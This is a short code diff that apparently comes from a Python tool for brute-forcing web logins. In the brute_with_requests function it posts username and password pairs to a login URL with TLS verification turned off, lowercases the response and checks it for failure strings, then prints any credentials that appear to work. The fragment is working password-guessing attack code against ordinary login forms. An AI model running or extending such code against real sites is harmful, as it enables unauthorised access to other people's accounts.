@@ -39,8 +39,9 @@ def brute_with_selenium(username, password):
         driver.quit()
 
 def brute_with_requests(username, password):
-    r = requests.post(URL, data={'username': username, 'password': password}, verify=False)
-    if not any(item in r.content for item in EXPRESSIONS):
+    a = requests.post(URL, data={'username': username, 'password': password}, verify=False)
+    r_content = a.content.lower()
+    if not any(item in r_content for item in EXPRESSIONS):
         print("\nBrute Forcing...")
         print("[+] Username: ", username)
         print("[+] Password: ", password)
